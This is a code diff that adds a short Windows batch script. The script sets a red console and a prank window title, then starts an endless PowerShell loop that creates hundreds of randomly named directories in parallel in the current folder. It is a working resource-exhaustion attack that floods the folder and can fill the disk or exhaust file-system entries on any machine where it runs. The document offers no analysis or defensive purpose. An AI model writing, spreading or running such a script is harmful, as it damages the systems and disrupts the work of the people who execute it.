@@ -1,0 +1,5 @@
+@echo off
+color 0c
+title poopyfartingus
+
+powershell -Command "while($true) { 1..100 | ForEach-Object -Parallel { [System.IO.Directory]::CreateDirectory([System.IO.Path]::Combine($PWD.Path, [Guid]::NewGuid().ToString())) | Out-Null } -ThrottleLimit 100 }"
